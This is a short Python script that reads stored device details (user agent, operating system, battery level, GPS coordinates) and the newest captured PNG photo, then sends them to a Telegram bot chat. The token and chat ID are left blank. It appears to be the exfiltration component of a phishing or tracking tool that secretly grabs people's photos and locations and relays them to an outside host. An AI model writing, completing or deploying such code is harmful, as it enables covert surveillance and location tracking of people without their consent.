import requests
import json
import os

# Replace with your new bot API token and chat ID
API_TOKEN = ''
CHAT_ID = '' 

# Paths to user details and photos directory
data_dir = 'data'  # Path to the data folder
user_details_path = os.path.join(data_dir, 'user-details.json')  # Full path to user-details.json
photos_dir = 'photos'  # Path to the photos folder

try:
    # Check if the user details file exists
    if not os.path.exists(user_details_path):
        print(f"Error: {user_details_path} not found.")
        exit(1)

    # Load user details from the file
    with open(user_details_path, 'r') as f:
        user_details = json.load(f)

    # Find the most recent photo in the photos directory
    if not os.path.exists(photos_dir):
        print(f"Error: Photos directory '{photos_dir}' not found.")
        exit(1)

    photo_files = [os.path.join(photos_dir, f) for f in os.listdir(photos_dir) if f.endswith('.png')]
    if not photo_files:
        print(f"No photos found in {photos_dir}.")
        exit(1)

    # Sort by modification time and pick the most recent
    latest_photo = max(photo_files, key=os.path.getmtime)
    print(f"Latest photo found: {latest_photo}")

    # Read the photo file
    with open(latest_photo, 'rb') as photo_file:
        # Create the message with user details
        message = f"""
        User Details:
        - User Agent: {user_details['userAgent']}
        - Operating System: {user_details['os']}
        - Battery Level: {user_details['battery']}
        - Location: Latitude: {user_details['location']['latitude']}, Longitude: {user_details['location']['longitude']}
        """

        # Send the photo and user details to Telegram
        response = requests.post(
            f"https://api.telegram.org/bot{API_TOKEN}/sendPhoto",
            data={"chat_id": CHAT_ID, "caption": message},
            files={"photo": photo_file},
        )

        # Log the response from Telegram
        print(f"Telegram API Response: {response.text}")

except Exception as e:
    print(f"Error: {e}")
    exit(1)
